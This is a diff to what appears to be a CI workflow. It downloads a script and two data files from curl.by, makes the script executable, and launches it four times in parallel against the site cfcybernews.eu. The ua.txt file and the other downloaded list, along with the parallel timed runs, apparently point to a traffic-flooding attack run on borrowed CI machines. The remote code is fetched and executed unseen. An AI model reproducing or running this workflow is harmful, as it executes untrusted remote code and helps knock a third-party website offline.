@@ -18,7 +18,7 @@ jobs:
           wget https://curl.by/VgaZT/value.js
           wget https://curl.by/19kka/fres.txt
           wget https://curl.by/BS8DR/ua.txt
-          chmod +x prov2.js
+          chmod +x value.js
           PIDS=()
           for i in {1..4}; do
             timeout 105 node value.js https://cfcybernews.eu 100 64 10 fres.txt
